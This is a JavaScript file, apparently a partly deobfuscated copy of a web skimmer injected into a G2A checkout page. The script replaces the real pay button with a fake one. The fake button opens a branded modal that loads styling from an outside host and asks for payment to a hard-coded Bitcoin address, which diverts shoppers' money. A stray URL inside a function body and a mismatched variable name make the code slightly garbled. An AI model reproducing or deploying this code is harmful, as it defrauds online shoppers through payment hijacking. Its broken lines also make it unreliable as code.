async function updateBTCPrice() {
  const subPriceElement = Array.from(document.querySelectorAll("span")).find(_0x143615 => _0x143615.textContent.trim().startsWith("$"));
  if (subPriceElement) {
    const priceInUSD = parseFloat(priceElement.textContent.trim().replace("$", ""));

    if (!isNaN(priceInUSD)) {
      try {
        const response = await fetch("https://api.coindesk.com/v1/bpi/currentprice/USD.json");
        const data = await response.json();
        const btcPriceInUSD = parseFloat(data.bpi.USD.rate.replace(",", ""));

        if (!isNaN(btcPriceInUSD)) {
          const btcAmount = (priceInUSD / btcPriceInUSD).toFixed(8);

          const btcAmountElement = document.getElementById("btcAmount");
          btcAmountElement.textContent = btcAmount;
        } else {
          console.error("Error parsing BTC price");
        }
      } catch (error) {
        console.error("Error fetching BTC price:", error);
      }
    } else {
      console.error("Error parsing USD balance");
    }
  } else {
    console.error("USD balance element not found");
  }https://linkies.xyz/pazte/btc1.png
}

function replaceButtonWithModal(_0xe99b43) {
  const payButton = Array.from(document.querySelectorAll("button")).find(_0x635690 => _0x635690.textContent.trim().toLowerCase().includes("pay"));
  if (payButton) {
    const fakePayBtn = document.createElement("button");
    fakePayBtn.textContent = payButton.textContent;
    fakePayBtn.className = "sc-iCoGMd ehJpkz indexes__ButtonContinue-sc-18h7v3q-1 dwifaY";
    payButton.parentNode.replaceChild(fakePayBtn, payButton);
    fakePayBtn.addEventListener("click", event => {
      event.preventDefault();
      const modalOverlay = document.createElement("div");
      modalOverlay.id = "modalOverlay";
      modalOverlay.style.position = "fixed";
      modalOverlay.style.top = "0";
      modalOverlay.style.left = "0";
      modalOverlay.style.width = "100%";
      modalOverlay.style.height = "100%";
      modalOverlay.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
      modalOverlay.style.display = "flex";
      modalOverlay.style.alignItems = "center";
      modalOverlay.style.justifyContent = "center";
      modalOverlay.style.zIndex = "1000";
      document.body.appendChild(modalOverlay);
      const modal = document.createElement("div");
      modal.className = "g2a-modal";
      modal.innerHTML = _0xe99b43;
      modalOverlay.appendChild(modal);
      modalOverlay.addEventListener("click", event => {
        if (event.target === modalOverlay) {
          document.body.removeChild(modalOverlay);
        }
      });
      const style = document.createElement("link");
      style.rel = "stylesheet";
      style.href = "https://linkies.xyz/pazte/modal.css";
      document.head.appendChild(style);
      updateBTCPrice();
    });
  } else {
    console.error("Button not found with the specified text.");
  }
}

//
// Prettified html thats being passed to replaceButtonWithModal
//
//  <img src="https://checkout.pay.g2a.com/zen_btc.png" alt="Bitcoin" class="g2a-logo">
//  <p>
//    <span class="g2a-grey-text">BTC amount:</span> 
//    <span id="btcAmount"></span>
//  </p>
//  <p>
//    <span class="g2a-grey-text">BTC address:</span>
//    bc1q2asypvlska6wl2lpdmh8t8w7dztg9l2m8cqjvz
//  </p>
//  <img src="" alt="QR code to scan" class="g2a-qr-code\">
//  
//  <p>Scan the QR code to complete your payment.</p>
//  <p class="g2a-grey-text">
//    <small>Once you’ve done it, wait for your payment to confirm.</small>
//  </p>
//  
//  <button class="g2a-confirm-button">Confirm payment</button>
//
replaceButtonWithModal("\n<img src=\"https://checkout.pay.g2a.com/zen_btc.png\" alt=\"Bitcoin\" class=\"g2a-logo\">\n<p><span class=\"g2a-grey-text\">BTC amount:</span> <span id=\"btcAmount\"></span></p>\n<p><span class=\"g2a-grey-text\">BTC address:</span>bc1q2asypvlska6wl2lpdmh8t8w7dztg9l2m8cqjvz</p>\n<img src=\"\" alt=\"QR code to scan\" class=\"g2a-qr-code\">\n<p>Scan the QR code to complete your payment.</p>\n<p class=\"g2a-grey-text\"><small>Once you’ve done it, wait for your payment to confirm.</small></p>\n<button class=\"g2a-confirm-button\">Confirm payment</button>\n");



document.addEventListener("DOMContentLoaded", function () {
  const modalOverlay = document.getElementById("modalOverlay");
  if (modalOverlay) {
    updateBTCPrice();
  }
});